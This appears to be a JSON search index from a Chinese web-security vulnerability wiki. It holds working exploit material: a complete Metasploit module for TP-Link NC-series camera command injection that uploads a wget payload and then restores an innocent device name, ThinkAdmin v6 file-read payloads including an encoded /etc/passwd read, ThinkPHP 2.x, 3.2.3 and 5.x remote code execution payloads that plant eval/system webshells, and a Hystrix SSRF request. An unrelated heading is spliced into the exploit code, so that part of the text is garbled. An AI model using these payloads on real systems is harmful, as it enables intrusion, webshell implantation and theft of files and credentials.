Netflix\uff0c2.2.4\u4e4b\u524d\u76842.2.x\u7248\u672c\uff0c2.1.6\u4e4b\u524d\u76842.1.x\u7248\u672c\u4ee5\u53ca\u8f83\u65e7\u7684\u4e0d\u53d7\u652f\u6301\u7684\u7248\u672c\u5141\u8bb8\u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528Hystrix Dashboard proxy.stream\u7aef\u70b9\u5411\u670d\u52a1\u5668\u6258\u7ba1\u53ef\u8bbf\u95ee\u7684\u4efb\u4f55\u670d\u52a1\u5668\u53d1\u51fa\u8bf7\u6c42\u4eea\u8868\u677f\u3002\u6076\u610f\u7528\u6237\u6216\u653b\u51fb\u8005\u53ef\u4ee5\u5c06\u8bf7\u6c42\u53d1\u9001\u5230\u4e0d\u5e94\u516c\u5f00\u516c\u5f00\u7684\u5176\u4ed6\u670d\u52a1\u5668\u3002","title":"\u6f0f\u6d1e\u4fe1\u606f:"},{"location":"Web%E5%AE%89%E5%85%A8/Spring%20Cloud%20Netflix%20Hystrix%20Dashboard%20SSRF/#_2","text":"Spring Cloud Netflix 2.2.0\u81f32.2.3 2.1.0\u81f32.1.5 \u8f83\u65e7\u7684\u4e0d\u53d7\u652f\u6301\u7684\u7248\u672c\u4e5f\u4f1a\u53d7\u5230\u5f71\u54cd","title":"\u5f71\u54cd\u8303\u56f4:"},{"location":"Web%E5%AE%89%E5%85%A8/Spring%20Cloud%20Netflix%20Hystrix%20Dashboard%20SSRF/#_3","text":"","title":"\u6f0f\u6d1e\u590d\u73b0:"},{"location":"Web%E5%AE%89%E5%85%A8/Spring%20Cloud%20Netflix%20Hystrix%20Dashboard%20SSRF/#poc","text":"/proxy.stream?origin=http://www.baidu.com \u200b``` #### \u4fee\u590d\u65b9\u6848: \u5b98\u65b9\u5df2\u7ecf\u8fdb\u884c\u5b89\u5168\u5347\u7ea7\uff0c\u53d7\u5f71\u54cd\u7528\u6237\u8bf7\u5c3d\u5feb\u5347\u7ea7\u5230\u4fee\u590d\u7248\u672c: Spring Cloud Netflix\uff1a 2.2.4 2.1.6 \u8f83\u65e7\u7684\u7248\u672c\u5e94\u5347\u7ea7\u5230\u53d7\u652f\u6301\u7684\u5206\u652f","title":"poc\uff1a"},{"location":"Web%E5%AE%89%E5%85%A8/Strusts2%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/","text":"\u8be5\u6587\u7ae0\u4e8e\u4ee5\u4e0b\u73af\u5883\u6d4b\u8bd5\u6709\u6548 \u00b6 \u7cfb\u7edf\u73af\u5883\uff1acentos7 java\u73af\u5883\uff1a1.8.0 tomcat\u73af\u5883\uff1a7.0.105 struts2\u73af\u5883\uff1a2.3.2 1.\u5b89\u88c5java \u00b6 yum -y install java-1.8.0-openjdk 2.\u5b89\u88c5tomcat \u00b6 \u4e0b\u8f7dtomcat tomcat\u4e0b\u8f7d\u5730\u5740 \u4e0b\u8f7d\u540e\u89e3\u538b tar -zxvf apache-tomcat-7.0.105.tar.gz 3.\u5b89\u88c5strust2 \u00b6 \u4e0b\u8f7dstruts2 \u94fe\u63a5: \u767e\u5ea6\u4e91\u76d8 \u63d0\u53d6\u7801: ycb3 \u5c06apps\u4e0b\u7684\u6240\u6709\u793a\u4f8b\uff08.war\uff09\u62f7\u8d1d\u5230tomcat\u8def\u5f84\u4e0b\uff08\u8def\u5f84\u4e3a /tomcat\u76ee\u5f55/webapps/ \uff09 4.\u542f\u52a8tomcat\u670d\u52a1 \u00b6 \u8fdb\u5165tomcat bin\u76ee\u5f55\u4e0b\uff0c sh start.sh \u6216\u8005 ./start.sh","title":"Strusts2\u6f0f\u6d1e\u73af\u5883\u642d\u5efa"},{"location":"Web%E5%AE%89%E5%85%A8/Strusts2%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#_1","text":"\u7cfb\u7edf\u73af\u5883\uff1acentos7 java\u73af\u5883\uff1a1.8.0 tomcat\u73af\u5883\uff1a7.0.105 struts2\u73af\u5883\uff1a2.3.2","title":"\u8be5\u6587\u7ae0\u4e8e\u4ee5\u4e0b\u73af\u5883\u6d4b\u8bd5\u6709\u6548"},{"location":"Web%E5%AE%89%E5%85%A8/Strusts2%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#1java","text":"yum -y install java-1.8.0-openjdk","title":"1.\u5b89\u88c5java"},{"location":"Web%E5%AE%89%E5%85%A8/Strusts2%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#2tomcat","text":"\u4e0b\u8f7dtomcat tomcat\u4e0b\u8f7d\u5730\u5740 \u4e0b\u8f7d\u540e\u89e3\u538b tar -zxvf apache-tomcat-7.0.105.tar.gz","title":"2.\u5b89\u88c5tomcat"},{"location":"Web%E5%AE%89%E5%85%A8/Strusts2%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#3strust2","text":"\u4e0b\u8f7dstruts2 \u94fe\u63a5: \u767e\u5ea6\u4e91\u76d8 \u63d0\u53d6\u7801: ycb3 \u5c06apps\u4e0b\u7684\u6240\u6709\u793a\u4f8b\uff08.war\uff09\u62f7\u8d1d\u5230tomcat\u8def\u5f84\u4e0b\uff08\u8def\u5f84\u4e3a /tomcat\u76ee\u5f55/webapps/ \uff09","title":"3.\u5b89\u88c5strust2"},{"location":"Web%E5%AE%89%E5%85%A8/Strusts2%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#4tomcat","text":"\u8fdb\u5165tomcat bin\u76ee\u5f55\u4e0b\uff0c sh start.sh \u6216\u8005 ./start.sh","title":"4.\u542f\u52a8tomcat\u670d\u52a1"},{"location":"Web%E5%AE%89%E5%85%A8/TP-Link%E4%BA%91%E6%91%84%E5%83%8F%E5%A4%B4NCXXX%E7%B3%BB%E5%88%97%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E2%BC%8A%E6%BC%8F%E6%B4%9E/","text":"1 ## 2 # This module requires Metasploit: https://metasploit.com/download 3 # Current source: https://github.com/rapid7/metasploit-framework 4 ## 5 6 class MetasploitModule < Msf::Exploit::Remote 7 Rank = ExcellentRanking 8 9 include Msf::Exploit::Remote::HttpClient 10 include Msf::Exploit::CmdStager 11 12 def initialize(info = {}) 13 super( 14 update_info( 15 info, 16 'Name' => 'TP-Link Cloud Cameras NCXXX Bonjour Command Injection', 17 'Description' => %q{ 18 TP-Link cloud cameras NCXXX series (NC200, NC210, NC220, NC230, 19 NC250, NC260, NC450) are vulnerable to an authenticated command 20 injection. In all devices except NC210, despite a check on the name length in 21 swSystemSetProductAliasCheck, no other checks are in place in order 22 to prevent shell metacharacters from being introduced. The system name 23 would then be used in swBonjourStartHTTP as part of a shell command 24 where arbitrary commands could be injected and executed as root. NC210 devices 25 cannot be exploited directly via /setsysname.cgi due to proper input 26 validation. NC210 devices are still vulnerable since swBonjourStartHTTP 27 did not perform any validation when reading the alias name from the 28 configuration file. The configuration file can be written, and code 29 execution can be achieved by combining this issue with CVE-2020-12110. 30 }, 31 'Author' => ['Pietro Oliva <pietroliva[at]gmail.com>'], 32 'License' => MSF_LICENSE, 33 'References' => 34 [ 35 [ 'URL', 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-12109' ], 36 [ 'URL', 'https://nvd.nist.gov/vuln/detail/CVE-2020-12109' ], 37 [ 'URL', 'https://seclists.org/fulldisclosure/2020/May/2' ], 38 [ 'CVE', '2020-12109'] 39 ], 40 'DisclosureDate' => '2020-04-29', 41 'Platform' => 'linux', 42 'Arch' => ARCH_MIPSLE, 43 'Targets' => 44 [ 45 [ 46 'TP-Link NC200, NC220, NC230, NC250', 47 { 48 'Arch' => ARCH_MIPSLE, 49 'Platform' => 'linux', 50 'CmdStagerFlavor' => [ 'wget' ] 51 } 52 ], 53 [ 54 'TP-Link NC260, NC450', 55 { 56 'Arch' => ARCH_MIPSLE, 57 'Platform' => 'linux', 58 'CmdStagerFlavor' => [ 'wget' ], 59 'DefaultOptions' => { 'SSL' => true } 60 } 61 ] 62 ], 63 'DefaultTarget' => 0 64 ) 65 ) 66 67 register_options( 68 [ 69 OptString.new('USERNAME', [ true, 'The web interface username', 'admin' ]), 70 OptString.new('PASSWORD', [ true, 'The web interface password for the specified userna 71 ] 72 ) 73 end 74 75 def login 76 user = datastore['USERNAME'] 77 pass = Base64.strict_encode64(datastore['PASSWORD']) 78 if target.name == 'TP-Link NC260, NC450' 79 pass = Rex::Text.md5(pass) 80 end 81 82 print_status(\"Authenticating with #{user}:#{pass} ...\") 83 begin 84 res = send_request_cgi({ 85 'uri' => '/login.fcgi', 86 'method' => 'POST', 87 'vars_post' => { 88 'Username' => user, 89 'Password' => pass 90 } 91 }) 92 if res.nil? || res.code == 404 93 fail_with(Failure::NoAccess, '/login.fcgi did not reply correctly. Wrong target ip?') 94 end 95 if res.body =~ /\\\"errorCode\\\"\\:0/ && res.headers.key?('Set-Cookie') && res.body =~ /toke 96 print_good(\"Logged-in as #{user}\") 97 @cookie = res.get_cookies.scan(/\\s?([^, ;]+?)=([^, ;]*?)[;,]/)[0][1] 98 print_good(\"Got cookie: #{@cookie}\") 99 @token = res.body.scan(/\"(token)\":\"([^,\"]*)\"/)[0][1] 100 print_good(\"Got token: #{@token}\") 101 else 102 fail_with(Failure::NoAccess, \"Login failed with #{user}:#{pass}\") 103 end 104 rescue ::Rex::ConnectionError 105 fail_with(Failure::Unreachable, 'Connection failed') 106 end 107 end 108 109 def enable_bonjour 110 res = send_request_cgi({ 111 'uri' => '/setbonjoursetting.fcgi', 112 'method' => 'POST', 113 'encode_params' => false, 114 'cookie' => \"sess=#{@cookie}\", 115 'vars_post' => { 116 'bonjourState' => '1', 33.SpamTitan 7.07\u591a\u4e2aRCE\u6f0f\u6d1e 117 'token' => @token.to_s 118 } 119 }) 120 return res 121 rescue ::Rex::ConnectionError 122 vprint_error(\"Failed connection to the web server at #{rhost}:#{rport}\") 123 return nil 124 end 125 126 def sys_name(cmd) 127 res = send_request_cgi({ 128 'uri' => '/setsysname.fcgi', 129 'method' => 'POST', 130 'encode_params' => true, 131 'cookie' => \"sess=#{@cookie}\", 132 'vars_post' => { 133 'sysname' => cmd, 134 'token' => @token.to_s 135 } 136 }) 137 return res 138 rescue ::Rex::ConnectionError 139 vprint_error(\"Failed connection to the web server at #{rhost}:#{rport}\") 140 return nil 141 end 142 143 def execute_command(cmd, _opts = {}) 144 print_status(\"Executing command: #{cmd}\") 145 sys_name(\"$(#{cmd})\") 146 end 147 148 def exploit 149 login # Get cookie and csrf token 150 enable_bonjour # Enable bonjour service 151 execute_cmdstager # Upload and execute payload 152 sys_name('NC200') # Set back an innocent-looking device name 153 end 154 155 end","title":" "},{"location":"Web%E5%AE%89%E5%85%A8/ThinkAdmin%20v6%20%E5%88%97%E7%9B%AE%E5%BD%95%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/","text":"ThinkAdmin v6 \u5217\u76ee\u5f55\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6 V5\u524d\uff0c\u76f4\u63a5\u4e5f\u80fd\u8bfb\u53d6 \u5217\u76ee\u5f55 poc: version()\u53ef\u4ee5\u83b7\u53d6\u5230\u5f53\u524d\u7248\u672c\uff1a2020.08.03.01\uff0c\u2264\u8fd9\u4e2a\u7248\u672c\u7684\u90fd\u6709\u53ef\u80fd\u5b58\u5728\u6f0f\u6d1e http://think.admin/ThinkAdmin/public/admin.html?s=admin/api.Update/version \u8bfb\u53d6\u7f51\u7ad9\u6839\u76ee\u5f55Payload: http://think.admin/ThinkAdmin/public/admin.html?s=admin/api.Update/node post:rules=[\"/\"] \u4e5f\u53ef\u4ee5\u4f7f\u7528../\u6765\u8fdb\u884c\u76ee\u5f55\u7a7f\u8d8a-\u300b rules=[\"../../../\"] \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6 \u9700\u8981\u8fdb\u884cencode() \u52a0\u5bc6\u4e00\u4e0b\u5b57\u7b26\u4e32 On Windows read database.php payload: database.php => public/static/../../config/database\"php /admin.html?s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b2r33322u2x2v1b2s2p382p2q2p372t0y342w34 On Linux read /etc/passwd payload: /admin.html?s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b2t382r1b342p37373b2s","title":"ThinkAdmin v6 \u5217\u76ee\u5f55\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6"},{"location":"Web%E5%AE%89%E5%85%A8/Thinkadmin%20v6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-25540%EF%BC%89/","text":"\u6f0f\u6d1e\u4fe1\u606f: \u00b6 ThinkAdmin\u662f\u4e00\u5957\u57fa\u4e8eThinkPHP\u6846\u67b6\u7684\u901a\u7528\u540e\u53f0\u7ba1\u7406\u7cfb\u7edf\u3002ThinkAdmin 6\u7248\u672c\u5b58\u5728\u8def\u5f84\u904d\u5386\u6f0f\u6d1e\u3002\u653b\u51fb\u8005\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u901a\u8fc7GET\u8bf7\u6c42\u7f16\u7801\u53c2\u6570\u4efb\u610f\u8bfb\u53d6\u8fdc\u7a0b\u670d\u52a1\u5668\u4e0a\u7684\u6587\u4ef6\u3002 \u5f71\u54cd\u8303\u56f4: \u00b6 Thinkadmin\u7248\u672c\u5c0f\u4e8e \u2264 2020.08.03.01 \u6f0f\u6d1e\u590d\u73b0: \u00b6 fofa_dork: \u201cThinkAdmin\u201d && title\u201d\u7cfb\u7edf\u767b\u5f55 \u00b7 ThinkAdmin\u201d POC: \u00b6 ``` POST /admin.html?s=admin/api.Update/node HTTP/1.1 Host: xxxxxx Accept: / Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 22 rules=%5B%22.%2F%22%5D ![](https://www.bylibrary.cn/wp-content/uploads/2020/09/\u5fae\u4fe1\u56fe\u7247_20200921085600.jpg) \u83b7\u53d6\u7248\u672c\u4fe1\u606f: https://xxxxx/admin.html?s=admin/api.Update/version ```2\u3001\u2f42\u4ef6\u8bfb\u53d6,\u540e\u2faf\u90a3\u2f00\u4e32\u662fUTF8\u5b57\u7b26\u4e32\u52a0\u5bc6\u540e\u7684\u7ed3\u679c\u3002\u8ba1\u7b97\u2f45\u5f0f\u5728Update.php\u4e2d\u7684\u52a0\u5bc6\u51fd\u6570\u3002 /admin.html? s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b2r33322u2x2v1b2s2p382p2q2p372t0y342w34 \u4fee\u590d\u65b9\u6848: \u00b6 \u76ee\u524d\u5382\u5546\u5df2\u7ecf\u53d1\u5e03\u4fee\u590d\u76f8\u5173\u95ee\u9898\uff0c\u8bf7\u53d7\u5f71\u54cd\u7528\u6237\u5c3d\u5feb\u5347\u7ea7\u5230\u5b89\u5168\u7248\u672c","title":"Thinkadmin v6\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e\uff08CVE-2020-25540\uff09"},{"location":"Web%E5%AE%89%E5%85%A8/Thinkadmin%20v6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-25540%EF%BC%89/#_1","text":"ThinkAdmin\u662f\u4e00\u5957\u57fa\u4e8eThinkPHP\u6846\u67b6\u7684\u901a\u7528\u540e\u53f0\u7ba1\u7406\u7cfb\u7edf\u3002ThinkAdmin 6\u7248\u672c\u5b58\u5728\u8def\u5f84\u904d\u5386\u6f0f\u6d1e\u3002\u653b\u51fb\u8005\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u901a\u8fc7GET\u8bf7\u6c42\u7f16\u7801\u53c2\u6570\u4efb\u610f\u8bfb\u53d6\u8fdc\u7a0b\u670d\u52a1\u5668\u4e0a\u7684\u6587\u4ef6\u3002","title":"\u6f0f\u6d1e\u4fe1\u606f:"},{"location":"Web%E5%AE%89%E5%85%A8/Thinkadmin%20v6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-25540%EF%BC%89/#_2","text":"Thinkadmin\u7248\u672c\u5c0f\u4e8e \u2264 2020.08.03.01","title":"\u5f71\u54cd\u8303\u56f4:"},{"location":"Web%E5%AE%89%E5%85%A8/Thinkadmin%20v6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-25540%EF%BC%89/#_3","text":"fofa_dork: \u201cThinkAdmin\u201d && title\u201d\u7cfb\u7edf\u767b\u5f55 \u00b7 ThinkAdmin\u201d","title":"\u6f0f\u6d1e\u590d\u73b0:"},{"location":"Web%E5%AE%89%E5%85%A8/Thinkadmin%20v6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-25540%EF%BC%89/#poc","text":"``` POST /admin.html?s=admin/api.Update/node HTTP/1.1 Host: xxxxxx Accept: / Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 22 rules=%5B%22.%2F%22%5D ![](https://www.bylibrary.cn/wp-content/uploads/2020/09/\u5fae\u4fe1\u56fe\u7247_20200921085600.jpg) \u83b7\u53d6\u7248\u672c\u4fe1\u606f: https://xxxxx/admin.html?s=admin/api.Update/version ```2\u3001\u2f42\u4ef6\u8bfb\u53d6,\u540e\u2faf\u90a3\u2f00\u4e32\u662fUTF8\u5b57\u7b26\u4e32\u52a0\u5bc6\u540e\u7684\u7ed3\u679c\u3002\u8ba1\u7b97\u2f45\u5f0f\u5728Update.php\u4e2d\u7684\u52a0\u5bc6\u51fd\u6570\u3002 /admin.html? s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b2r33322u2x2v1b2s2p382p2q2p372t0y342w34","title":"POC:"},{"location":"Web%E5%AE%89%E5%85%A8/Thinkadmin%20v6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-25540%EF%BC%89/#_4","text":"\u76ee\u524d\u5382\u5546\u5df2\u7ecf\u53d1\u5e03\u4fee\u590d\u76f8\u5173\u95ee\u9898\uff0c\u8bf7\u53d7\u5f71\u54cd\u7528\u6237\u5c3d\u5feb\u5347\u7ea7\u5230\u5b89\u5168\u7248\u672c","title":"\u4fee\u590d\u65b9\u6848:"},{"location":"Web%E5%AE%89%E5%85%A8/Thinkphp%202.X%20RCE%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u8303\u56f4 \u00b6 Thinkphp 2.X \u6f0f\u6d1ePOC \u00b6 /index.php?s=/index/index/xxx/${@phpinfo()} /index.php?s=/index/index/xxx/${@print(system($_POST[a]))} \u83dc\u5200\u8fde\u63a5,\u5bc6\u7801\u4e3aa\u3002","title":"Thinkphp 2.X RCE\u6f0f\u6d1e"},{"location":"Web%E5%AE%89%E5%85%A8/Thinkphp%202.X%20RCE%E6%BC%8F%E6%B4%9E/#_1","text":"Thinkphp 2.X","title":"\u6f0f\u6d1e\u8303\u56f4"},{"location":"Web%E5%AE%89%E5%85%A8/Thinkphp%202.X%20RCE%E6%BC%8F%E6%B4%9E/#poc","text":"/index.php?s=/index/index/xxx/${@phpinfo()} /index.php?s=/index/index/xxx/${@print(system($_POST[a]))} \u83dc\u5200\u8fde\u63a5,\u5bc6\u7801\u4e3aa\u3002","title":"\u6f0f\u6d1ePOC"},{"location":"Web%E5%AE%89%E5%85%A8/Thinkphp%202.X%20RCE%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/","text":"\u5b89\u88c5docker\u73af\u5883 \u00b6 \u70b9\u51fb\u67e5\u770b\u6559\u7a0b \u00b6 \u4e0b\u8f7dvulhub\u9879\u76ee \u00b6 \u9879\u76ee\u5730\u5740\uff1a https://github.com/vulhub/vulhub \u4e0b\u8f7d\u540e\u8fdb\u5165\u9879\u76ee\u76ee\u5f55\u4e0bthinkphp/2-rce\u76ee\u5f55\uff1a cd vunhub-master/thinkphp/2-rce \u5f00\u542f\u672c\u6b21\u6f0f\u6d1e\u73af\u5883\uff1a docker-compose up -d \u6d4f\u89c8\u5668\u8bbf\u95ee\u73af\u5883\u670d\u52a1\u5668 ip:8080 \u73af\u5883\u642d\u5efa\u5b8c\u6210\uff01 \u00b6","title":"Thinkphp 2.X RCE\u6f0f\u6d1e\u73af\u5883\u642d\u5efa"},{"location":"Web%E5%AE%89%E5%85%A8/Thinkphp%202.X%20RCE%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#docker","text":"","title":"\u5b89\u88c5docker\u73af\u5883"},{"location":"Web%E5%AE%89%E5%85%A8/Thinkphp%202.X%20RCE%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#_1","text":"","title":"\u70b9\u51fb\u67e5\u770b\u6559\u7a0b"},{"location":"Web%E5%AE%89%E5%85%A8/Thinkphp%202.X%20RCE%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#vulhub","text":"\u9879\u76ee\u5730\u5740\uff1a https://github.com/vulhub/vulhub \u4e0b\u8f7d\u540e\u8fdb\u5165\u9879\u76ee\u76ee\u5f55\u4e0bthinkphp/2-rce\u76ee\u5f55\uff1a cd vunhub-master/thinkphp/2-rce \u5f00\u542f\u672c\u6b21\u6f0f\u6d1e\u73af\u5883\uff1a docker-compose up -d \u6d4f\u89c8\u5668\u8bbf\u95ee\u73af\u5883\u670d\u52a1\u5668 ip:8080","title":"\u4e0b\u8f7dvulhub\u9879\u76ee"},{"location":"Web%E5%AE%89%E5%85%A8/Thinkphp%202.X%20RCE%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#_2","text":"","title":"\u73af\u5883\u642d\u5efa\u5b8c\u6210\uff01"},{"location":"Web%E5%AE%89%E5%85%A8/Thinkphp%203.2.3%20%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/","text":"\u5f71\u54cd\u8303\u56f4 \u00b6 Thinkphp 3.2.3 \u6f0f\u6d1e\u4ea7\u751f\u6761\u4ef6 \u00b6 \u6b64\u7248\u672c\u9ed8\u8ba4\u7684\u7f13\u5b58\u5904\u7406\u673a\u5236\u4e2d\uff0c\u7f13\u5b58\u6587\u4ef6\u662f\u4e00\u4e2a\u53ef\u8bbf\u95ee\u7684.php\u6587\u4ef6\uff0c\u7f16\u7a0b\u4eba\u5458\u628a\u7528\u6237\u53ef\u63a7\u53c2\u6570\u5199\u5165\u7f13\u5b58\u5219\u4f1a\u4ea7\u751f\u6f0f\u6d1e\u3002 \u6f0f\u6d1e\u9a8c\u8bc1POC \u00b6 \u83b7\u53d6\u7528\u6237\u53ef\u63a7\u53c2\u6570\u5199\u5165\u7f13\u5b58 \u00b6 \u4f8b\uff1a <?php namespace Home\\Controller; use Think\\Controller; class IndexController extends Controller { public function index(){ $a=I('post.a'); S('name',$a); } } \u7528\u6237\u4f20\u53c2\u6570\uff1a \u00b6 ?a=%0aeval($_POST['aaa']);%0a %0a\u4e3a\u6362\u884c\u7b26\uff0c\u9ed8\u8ba4\u5b58\u5165\u7f13\u5b58\u6587\u4ef6\u65f6\u7528\u6237\u53c2\u6570\u5b58\u5728\u4e8e\u6ce8\u91ca\u4e2d\u3002 \u5199\u5165\u7f13\u5b58\u6587\u4ef6\uff0c\u6587\u4ef6\u540d\u4e3amd5\u52a0\u5bc6 \u00b6 md5(name) \u6587\u4ef6\u9ed8\u8ba4\u8def\u5f84 \u00b6 <domain>/Application/Runtime/Temp/<md5>.php \u83dc\u5200\u8fde\u63a5 \u00b6 http://xxxxxxx/Application/Runtime/Temp/<md5>.php \u5bc6\u7801aaa","title":"Thinkphp 3.2.3 \u7f13\u5b58\u6f0f\u6d1e"},{"location":"Web%E5%AE%89%E5%85%A8/Thinkphp%203.2.3%20%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/#_1","text":"Thinkphp 3.2.3","title":"\u5f71\u54cd\u8303\u56f4"},{"location":"Web%E5%AE%89%E5%85%A8/Thinkphp%203.2.3%20%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/#_2","text":"\u6b64\u7248\u672c\u9ed8\u8ba4\u7684\u7f13\u5b58\u5904\u7406\u673a\u5236\u4e2d\uff0c\u7f13\u5b58\u6587\u4ef6\u662f\u4e00\u4e2a\u53ef\u8bbf\u95ee\u7684.php\u6587\u4ef6\uff0c\u7f16\u7a0b\u4eba\u5458\u628a\u7528\u6237\u53ef\u63a7\u53c2\u6570\u5199\u5165\u7f13\u5b58\u5219\u4f1a\u4ea7\u751f\u6f0f\u6d1e\u3002","title":"\u6f0f\u6d1e\u4ea7\u751f\u6761\u4ef6"},{"location":"Web%E5%AE%89%E5%85%A8/Thinkphp%203.2.3%20%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/#poc","text":"","title":"\u6f0f\u6d1e\u9a8c\u8bc1POC"},{"location":"Web%E5%AE%89%E5%85%A8/Thinkphp%203.2.3%20%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/#_3","text":"\u4f8b\uff1a <?php namespace Home\\Controller; use Think\\Controller; class IndexController extends Controller { public function index(){ $a=I('post.a'); S('name',$a); } }","title":"\u83b7\u53d6\u7528\u6237\u53ef\u63a7\u53c2\u6570\u5199\u5165\u7f13\u5b58"},{"location":"Web%E5%AE%89%E5%85%A8/Thinkphp%203.2.3%20%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/#_4","text":"?a=%0aeval($_POST['aaa']);%0a %0a\u4e3a\u6362\u884c\u7b26\uff0c\u9ed8\u8ba4\u5b58\u5165\u7f13\u5b58\u6587\u4ef6\u65f6\u7528\u6237\u53c2\u6570\u5b58\u5728\u4e8e\u6ce8\u91ca\u4e2d\u3002","title":"\u7528\u6237\u4f20\u53c2\u6570\uff1a"},{"location":"Web%E5%AE%89%E5%85%A8/Thinkphp%203.2.3%20%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/#md5","text":"md5(name)","title":"\u5199\u5165\u7f13\u5b58\u6587\u4ef6\uff0c\u6587\u4ef6\u540d\u4e3amd5\u52a0\u5bc6"},{"location":"Web%E5%AE%89%E5%85%A8/Thinkphp%203.2.3%20%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/#_5","text":"<domain>/Application/Runtime/Temp/<md5>.php","title":"\u6587\u4ef6\u9ed8\u8ba4\u8def\u5f84"},{"location":"Web%E5%AE%89%E5%85%A8/Thinkphp%203.2.3%20%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/#_6","text":"http://xxxxxxx/Application/Runtime/Temp/<md5>.php \u5bc6\u7801aaa","title":"\u83dc\u5200\u8fde\u63a5"},{"location":"Web%E5%AE%89%E5%85%A8/Thinkphp%205.0.%287-22%29%265.1.%280-30%29%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u5f71\u54cd \u00b6 5.0.7<=ThinkPHP5<=5.0.22 5.1.0<=ThinkPHP<=5.1.30 \u6f0f\u6d1ePOC \u00b6 5.0.x ?s=index/think\\config/get&name=database.username # \u83b7\u53d6\u914d\u7f6e\u4fe1\u606f ?s=index/\\think\\Lang/load&file=../../test.jpg # \u5305\u542b\u4efb\u610f\u6587\u4ef6 ?s=index/\\think\\Config/load&file=../../t.php # \u5305\u542b\u4efb\u610f.php\u6587\u4ef6 ?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id 5.1.x","title":"Thinkphp 5.0.(7-22)&5.1.(0-30)\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e"},{"location":"Web%E5%AE%89%E5%85%A8/Thinkphp%205.0.%287-22%29%265.1.%280-30%29%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_1","text":"5.0.7<=ThinkPHP5<=5.0.22 5.1.0<=ThinkPHP<=5.1.30","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"Web%E5%AE%89%E5%85%A8/Thinkphp%205.0.%287-22%29%265.1.%280-30%29%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#poc","text":"5.0.x ?s=index/think\\config/get&name=database.username # \u83b7\u53d6\u914d\u7f6e\u4fe1\u606f ?s=index/\\think\\Lang/load&file=../../test.jpg # \u5305\u542b\u4efb\u610f\u6587\u4ef6 ?s=index/\\think\\Config/load&file=../../t.php # 